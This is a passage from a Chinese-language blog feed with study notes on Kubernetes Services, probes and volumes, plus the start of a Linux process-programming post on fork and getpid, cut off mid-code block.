pod完成任务的时间</h5><p>通过在pod配置中设置<code>activeDeadlineSeconds</code>属性，可以限制pod的时间，如果pod运行时间超过此时间，系统将尝试终止pod，并将Job标记为失败。</p><h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>Kubernetes服务是一种为一组功能相同的pod提供单一不变的接入点的资源。当服务存在时，它的IP地址和端口不会改变，客户端通过IP地址和端口号建立连接，这些连接会被路由到提供该服务的任意一个pod上，通过这种方式，客户端不需要知道每个单独的提供服务的pod的地址，这样这些pod就可以在集群中随时被创建或移除。如下图展示的是一个客户端访问前端，前端访问后端服务的例子。</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/5.png" alt="5"></p><h5 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h5><p>在创建服务之前，我们先通过创建ReplicationController运行三个包含Node.js应用的pod。还是使用的是之前创建的<code>kubia-rc.yaml</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-rc.yaml</span><br></pre></td></tr></table></figure><p>通过<code>kubectl get</code>命令检测pod是否成功启动，并查看这三个pod的标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods --show-labels</span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE   LABELS</span><br><span class="line">kubia-hvlfd   1/1     Running   0          14s   app=kubia</span><br><span class="line">kubia-n6nfn   1/1     Running   0          14s   app=kubia</span><br><span class="line">kubia-ndbnt   1/1     Running   0          14s   app=kubia</span><br></pre></td></tr></table></figure><p>这个时候通过YAML描述文件来创建服务，该YAML文件的名为<code>kubia-svc.yaml</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia</span><br><span class="line">spec:</span><br><span class="line">  ports:</span><br><span class="line">  - port:80 #该服务的可用端口</span><br><span class="line">    targetPort: 8080  #服务将连接转发到的容器端口</span><br><span class="line">  selector:</span><br><span class="line">    app: kubia #具有app=kubia标签的pod都属于该服务</span><br></pre></td></tr></table></figure><p>通过<code>kubectl create</code>发布文件创建服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-svc.yaml</span><br></pre></td></tr></table></figure><p>列出所有的服务资源，如下命令，可以看到第二个是我们创建的服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get svc</span><br><span class="line">NAME         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)   AGE</span><br><span class="line">kubernetes   ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP   44h</span><br><span class="line">kubia        ClusterIP   10.111.239.153   &lt;none&gt;        80/TCP    24s</span><br></pre></td></tr></table></figure><h5 id="从内部集群测试服务"><a href="#从内部集群测试服务" class="headerlink" title="从内部集群测试服务"></a>从内部集群测试服务</h5><ul><li>创建一个pod，它将请求发送到服务的集群IP并记录响应，可以通过查看pod日志检查服务的响应。</li><li>使用ssh远程登录到其中一个Kubernetes节点上，然后使用curl命令。</li><li>可以通过<code>kubectl exec</code>命令在一个已经存在的pod中执行curl命令。</li></ul><p>我们使用最后一种方式来进行测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec kubia-hvlfd -- curl -s http://10.111.239.153</span><br><span class="line">You've hit kubia-ndbnt</span><br></pre></td></tr></table></figure><p>我们来解释一下上述命令执行了哪些操作。首先是在一个pod容器上，利用Kubernetes去执行curl命令，curl命令向一个后端有三个pod服务的IP发送了HTTP请求，这个时候Kubernetes服务代理拦截该连接，在三个pod中任意选择了一个pod，然后将请求转发给它。<code>Node.js</code>在pod中运行处理请求，并返回带有pod名称的HTTP响应，接着curl命令向标准输出打印返回值，该返回值被<code>kubectl</code>截取并打印到主机的标准输出。</p><h4 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h4><p>Kubernetes还为客户端提供了发现服务的IP和端口的方式</p><h5 id="通过环境变量发现服务"><a href="#通过环境变量发现服务" class="headerlink" title="通过环境变量发现服务"></a>通过环境变量发现服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec kubia-695cf env</span><br><span class="line">kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">HOSTNAME=kubia-695cf</span><br><span class="line">KUBIA_SERVICE_HOST=10.111.239.153</span><br><span class="line">KUBIA_SERVICE_PORT=80</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.96.0.1</span><br><span class="line">KUBERNETES_SERVICE_PORT=443</span><br></pre></td></tr></table></figure><h5 id="通过DNS发现服务"><a href="#通过DNS发现服务" class="headerlink" title="通过DNS发现服务"></a>通过DNS发现服务</h5><p>运行一个DNS服务的pod，在集群中的其他pod都被配置成使用其作为DNS，运行在pod上的进程DNS查询都会被Kubernetes自身的DNS服务器响应，该服务器知道系统中运行的所有服务。</p><h4 id="将服务暴露给外部客户端"><a href="#将服务暴露给外部客户端" class="headerlink" title="将服务暴露给外部客户端"></a>将服务暴露给外部客户端</h4><ul><li>将服务的类型设置成<code>NodePort</code>：每个集群节点都会在节点上打开一个端口，对于<code>NodePort</code>服务，每个集群节点在节点本身上打开一个端口，并将在该端口上接收到的流量重定向到基础服务，该服务仅在内部集群IP和端口上才能访问，但也可通过所有节点上的专用端口访问。</li><li>将服务的类型设置成<code>LoadBalance</code>：这是<code>NodePort</code>类型的一种扩展，这使得服务可以通过一个专用的负载均衡器来访问，这是由Kubernetes中正在运行的云基础设施提供的，负载均衡器将流量重定向到跨所有节点的节点端口，客户端通过负载均衡器的IP连接到服务。</li><li>创建一个Ingress资源：这是一个完全不同的机制，通过一个IP地址公开多个服务，它运行在HTTP层，因此可以提供比工作在第四层的服务更多的功能。</li></ul><h5 id="创建NodePort类型的服务"><a href="#创建NodePort类型的服务" class="headerlink" title="创建NodePort类型的服务"></a>创建NodePort类型的服务</h5><p>创建一个名为<code>kubia-svc-nodeport.yaml</code>的YAML文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia-nodeport</span><br><span class="line">spec:</span><br><span class="line">  type: NodePort #为NodePort设置服务类型</span><br><span class="line">  ports:</span><br><span class="line">  - port: 80  #服务集群IP的端口号</span><br><span class="line">    targetPort: 8080  #背后pod的目标端口号</span><br><span class="line">    nodePort: 30123   #通过集群节点的30123端口可以访问该服务</span><br><span class="line">  selector:</span><br><span class="line">    app: kubia</span><br></pre></td></tr></table></figure><p>创建该服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-svc-nodeport.yaml</span><br></pre></td></tr></table></figure><p>查看该服务的基础信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl get svc kubia-nodeport</span><br><span class="line">NAME             TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE</span><br><span class="line">kubia-nodeport   NodePort   10.107.251.184   &lt;none&gt;        80:30123/TCP   92s</span><br></pre></td></tr></table></figure><p>因为我是通过Docker-desktop for mac在本地搭建环境，所以可以通过<code>localhost:30123</code>进行访问</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % curl localhost:30123</span><br><span class="line">You've hit kubia-695cf</span><br></pre></td></tr></table></figure><p>如下图显示了服务暴露在两个集群节点的端口30123上。到达任何一个端口的传入连接将被重定向到一个随机选择的pod，该pod是否位于接收到连接的节点上是不确定的。</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/6.png" alt="6"></p><h5 id="创建LoadBalance服务"><a href="#创建LoadBalance服务" class="headerlink" title="创建LoadBalance服务"></a>创建LoadBalance服务</h5><p>创建一个名为<code>kubia-svc-loadbalancer.yaml</code>的YAML文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia-loadbalancer</span><br><span class="line">spec:</span><br><span class="line">  type: LoadBalancer </span><br><span class="line">  ports:</span><br><span class="line">  - port: 80  </span><br><span class="line">    targetPort: 8080  </span><br><span class="line">  selector:</span><br><span class="line">    app: kubia</span><br></pre></td></tr></table></figure><p>创建该服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-svc-loadbalancer.yaml</span><br></pre></td></tr></table></figure><p>如下图所示为外部客户端连接一个LoadBalancer服务</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/7.png" alt="7"></p><h4 id="就绪探针"><a href="#就绪探针" class="headerlink" title="就绪探针"></a>就绪探针</h4><p>就绪探测器会定期调用，并确定特定的pod是否接受客户端的请求，当容器的准备就绪探测返回成功时，表示容器已经准备好接收请求。</p><h5 id="就绪探针类型"><a href="#就绪探针类型" class="headerlink" title="就绪探针类型"></a>就绪探针类型</h5><ul><li>Exec探针，执行进程的地方。容器的状态由进程的退出状态代码确定</li><li>HTTP GET探针，向容器发送HTTP GET请求，通过响应的HTTP状态码判断容器是否准备好</li><li>TCP socket探针，打开一个TCP连接到容器的指定端口，如果连接已建立，则认为容器已准备就绪</li></ul><h4 id="卷"><a href="#卷" class="headerlink" title="卷"></a>卷</h4><p>Kubernetes的卷时pod的一个组成部分，因此像容器一样在pod的规范中就定义了，它们不是独立的Kubernetes对象，也不能单出创建或删除，pod中的所有容器都可以使用卷，但必须先将它挂载在每个需要访问它的容器中，在每个容器中，都可以在其文件系统的任意位置挂载卷。</p><h5 id="卷类型"><a href="#卷类型" class="headerlink" title="卷类型"></a>卷类型</h5><ul><li>emptyDir：用于存储临时数据的简单空目录</li><li>hostPath：用于将目录从工作节点的文件系统挂载到pod中</li><li>gitRepo：通过检出Git仓库的内容来初始化的卷</li><li>nfs：挂载到pod中的NFS共享卷</li><li>gcePersistentDisk：Google高效能型存储磁盘卷</li><li>cinder、cephfs、iscsi、flocker、glusterfs、quobyte、rbd、flexVolume、vsphere-Volume、photonPersistentDisk、scaleIO用于挂载其他类型的网络存储</li><li>configMap、secret、downwordAPI：用于将Kubernetes部分资源和集群信息公开给pod的特殊类型的卷</li><li>persistentVolumeClaim：一种使用预置或者动态配置的持久存储类型</li></ul><h5 id="在pod中使用emptyDir卷"><a href="#在pod中使用emptyDir卷" class="headerlink" title="在pod中使用emptyDir卷"></a>在pod中使用emptyDir卷</h5><p>现在有两个镜像需要运行在pod上，首先创建一个名为<code>fortune-pod.yaml</code>的文件。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">fortune</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">luksa/fortune</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">html-generator</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/var/htdocs</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:alpine</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">web-server</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/usr/share/nginx/html</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">    <span class="attr">emptyDir:</span> <span class="string">&#123;&#125;</span></span><br></pre></td></tr></table></figure><p>pod包含两个容器和一个挂载在两个容器中的共用的卷，但在不同的路径上。当<code>html-generator</code>容器启动时，它每10秒启动一次fortune命令输出到<code>var/htdocs/index.html</code>文件，因为卷是在<code>/var/htdocs</code>上挂载的，所以<code>index.html</code>文件被写入卷中，而不是容器的顶层，一旦<code>web-server</code>容器启动，他就开始为<code>/usr/share/nginx/html</code>目录中的任意HTML文件提供服务，因为我们将卷挂载在那个确切的位置，Nginx将为运行fortune循环的容器输出的<code>index.html</code>文件提供服务，最终的效果是，一个客户端向pod上的80端口发送一个HTTP请求，将接收当前的fortune消息作为响应。</p><p>为了查看fortune消息，需要启动对pod的访问，可以尝试将端口从本地机器转发到pod来实现</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl port-forward fortune 8080:80</span><br><span class="line">Forwarding from 127.0.0.1:8080 -&gt; 80</span><br><span class="line">Forwarding from [::1]:8080 -&gt; 80</span><br></pre></td></tr></table></figure><p>使用<code>curl</code>命令访问Nginx服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % curl localhost:8080</span><br><span class="line">All things that are, are with more spirit chased than enjoyed.</span><br><span class="line">-- Shakespeare, "Merchant of Venice"</span><br><span class="line">caoyifan@MacBookPro ~ % curl localhost:8080</span><br><span class="line">A horse!  A horse!  My kingdom for a horse!</span><br><span class="line">-- Wm. Shakespeare, "Richard III"</span><br><span class="line">caoyifan@MacBookPro ~ % curl localhost:8080</span><br><span class="line">Avoid gunfire in the bathroom tonight.</span><br><span class="line">caoyifan@MacBookPro ~ % curl localhost:8080</span><br><span class="line">For courage mounteth with occasion.</span><br><span class="line">-- William Shakespeare, "King John"</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;对于《Kubernetes in action》这本书前三章节相关的笔记，我都记录在下面这个链接了，有需求的可以看看。&lt;/p&gt;
&lt;p&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统编程(二)</title>
    <link href="elssm.github.io/2021/10/05/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E4%BA%8C/"/>
    <id>elssm.github.io/2021/10/05/Linux系统编程-二/</id>
    <published>2021-10-05T06:22:18.000Z</published>
    <updated>2021-10-20T03:13:14.052Z</updated>
    
    <content type="html"><![CDATA[<h4 id="进程和程序"><a href="#进程和程序" class="headerlink" title="进程和程序"></a>进程和程序</h4><ul><li>程序：只占用磁盘空间</li><li>进程：运行起来的程序，占用内存、CPU等系统资源</li></ul><h4 id="进程控制块PCB"><a href="#进程控制块PCB" class="headerlink" title="进程控制块PCB"></a>进程控制块PCB</h4><ul><li>进程id：系统中每个进程有唯一的id，在C语言中用<code>pid_t</code>类型表示，其实就是一个非负整数</li><li>进程的状态：有就绪、运行、挂起、停止等状态</li><li>进程切换时需要保存和恢复的一些CPU寄存器</li><li>描述虚拟地址空间的信息</li><li>描述控制终端的信息</li><li>当前工作目录</li><li>umask掩码</li><li>文件描述符表，包含很多指向file结构体的指针</li><li>和信号相关的信息</li><li>用户id和组id</li><li>会话（Session）和进程组</li><li>进程可以使用的资源上限</li></ul><h4 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h4><h5 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h5><p>创建一个新的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pid_t fork(void)</span><br><span class="line"></span><br><span class="line">父子进程各自返回</span><br><span class="line">父进程返回子进程pid</span><br><span class="line">子进程返回0</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-1---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-2---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-3---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-4---\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----child is created\n"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----parent process: my child is %d\n"</span>,pid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"=============end of file\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="getpid"><a href="#getpid" class="headerlink" title="getpid"></a>getpid</h5><p>获取子进程</p><h5 id="getppid"><a href="#getppid" class="headerlink" title="getppid"></a>getppid</h5><p>获取父进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-1---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-2---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-3---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-4---\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----child is created,pid=%d,parent-pid=%d\n"</span>,getpid(),getppid());</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----parent process: my child is %d,my pid:%d,my parent pid:%d\n"</span>,pid,getpid(),getppid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"=============end of file\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行代码后发现结果如下，在子进程中得到的父进程的pid为1。按理应该得到的结果是21237才对。最后查阅相关信息发现，由于父进程先退出了，造成了子进程被<code>init(ID=1)</code>接管，所以得到的结果是1。这里采用的解决办法是在父进程中sleep几秒，让父进程晚于子进程结束即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">before fork-1---</span><br><span class="line">before fork-2---</span><br><span class="line">before fork-3---</span><br><span class="line">before fork-4---</span><br><span class="line">----child is created,pid=21238,parent-pid=1</span><br><span class="line">=============end of file</span><br><span class="line">----parent process: my child is 21238,my pid:21237,my parent pid:15776</span><br><span class="line">=============end of file</span><br></pre></td></tr></table></figure><h5 id="循环创建多个子进程"><a href="#循环创建多个子进程" class="headerlink" title="循环创建多个子进程"></a>循环创建多个子进程</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(fork() == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm parent\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm %dth child\n"</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="getuid"><a href="#getuid" class="headerlink" title="getuid"></a>getuid</h5><p>获取用户id</p><h5 id="getgid"><a href="#getgid" class="headerlink" title="getgid"></a>getgid</h5><p>获取组id</p><h5 id="进程共享"><a href="#进程共享" class="headerlink" title="进程共享"></a>进程共享</h5><p>父子进程之间在fork后，有哪些异同</p><p>刚fork之后，相同之处，全局变量、<code>.data</code>、<code>.text</code>、栈、堆、环境变量、用户ID、宿主目录、进程工作目录、信号处理方式</p><p>不同之处，进程ID，fork返回值，各自的父进程ID，进程运行时间，闹钟(定时器)，未决信号集</p><p>通过程序判断父子进程是否共享全局变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 